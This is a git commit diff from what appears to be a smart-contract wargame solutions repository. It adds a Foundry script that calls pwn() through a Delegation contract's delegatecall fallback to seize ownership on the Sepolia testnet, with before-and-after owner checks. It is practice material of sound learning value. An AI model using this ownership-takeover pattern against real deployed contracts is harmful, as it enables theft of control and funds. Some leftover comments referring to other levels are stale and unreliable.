76f680e7f134986db446a852c3eb924ece148dde
RicardoMuchacho <ricardojrmuchacho@gmail.com>
2025-06-13 17:44:51 +0200

    Lvl6 solved

--- Level6/attacker.s.sol
+++ Level6/attacker.s.sol
@@ -1,42 +1,38 @@
-// // SPDX-License-Identifier: MIT
+// SPDX-License-Identifier: MIT
 
-// pragma solidity >=0.8.24;
+pragma solidity >=0.8.24;
 
-// import {Script} from "forge-std/Script.sol";
-// import {TelephoneAttacker} from "./attacker.sol";
-// import {console} from "forge-std/Test.sol";
+import {Script} from "forge-std/Script.sol";
+import {Delegation} from "./Delegation.sol";
+import {console} from "forge-std/Test.sol";
 
-// contract Attacker is Script {
-//     address public target = 0xc44d190689b311Bfe30B1Beb0FFf366E3A7be84b;
-//     string SEPOLIA_RPC = "wss://sepolia.drpc.org";
-//     uint256 Factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+contract DelegationAttack is Script {
+    address public target = 0x7eEB42235a93921Dc06Bc978B4773BC18D60044E;
+    string SEPOLIA_RPC = "wss://sepolia.drpc.org";
 
-//     function run() external returns (TelephoneAttacker) {
-//         uint256 privateKey = vm.envUint("PRIVATE_KEY");
-//         vm.createSelectFork(SEPOLIA_RPC);
+    function run() external {
+        uint256 privateKey = vm.envUint("PRIVATE_KEY");
+        vm.createSelectFork(SEPOLIA_RPC);
 
-//         vm.startBroadcast(privateKey);
-
-//         TelephoneAttacker attacker = new TelephoneAttacker(target);
-//         console.log("Attacker contract deployed at:", address(attacker));
+        vm.startBroadcast(privateKey);
+        (bool success ,) = address(target).call(abi.encodeWithSignature("pwn()"));
+        require(success, "Failed Transaction");
         
-//         vm.stopBroadcast();
+        vm.stopBroadcast();
+    }
+}
 
-//         return attacker;
-//     }
-// }
+// # First, source your .env file
+// source .env
 
-// // # First, source your .env file
-// // source .env
+// To run the script:
+// forge script Level6/attacker.s.sol --broadcast --rpc-url https://1rpc.io/sepolia
 
-// // To run the script:
-// // forge script Level4/attacker.s.sol --broadcast --rpc-url https://1rpc.io/sepolia
+// # Cast send for the contract
+// cast send 0xD4E95E7F8BB321786CD1ecFd6FE7A00548C0665B "changeOwner()" --rpc-url https://1rpc.io/sepolia --private-key $PRIVATE_KEY
 
-// // # Cast send for the contract
-// // cast send 0xD4E95E7F8BB321786CD1ecFd6FE7A00548C0665B "changeOwner()" --rpc-url https://1rpc.io/sepolia --private-key $PRIVATE_KEY
-
-// // To check consecutive wins:
-// // cast call 0xfA2dD651a41da693E6e53a002f6A04466c5c6793 "changeOwner()" --rpc-url wss://sepolia.drpc.org
+// To check consecutive wins:
+// cast call 0xfA2dD651a41da693E6e53a002f6A04466c5c6793 "changeOwner()" --rpc-url wss://sepolia.drpc.org
 
 
-// //$ forge script Level4/attacker.s.sol --broadcast --rpc-url https://1rpc.io/sepolia --verify
+//$ forge script Level4/attacker.s.sol --broadcast --rpc-url https://1rpc.io/sepolia --verify
--- Level6/solution.md
+++ Level6/solution.md
@@ -11,4 +11,13 @@ The goal of this level is for you to claim ownership of the instance you are giv
 ## Solution
 
 
+## Commands
+
+await contract.owner()
+'0x73379d8B82Fda494ee59555f333DF7D44483fD58'
+
+// Runned attacker script on foundry 
+
+await contract.owner()
+'0xc717879FBc3EA9F770c0927374ed74A998A3E2Ce'
 
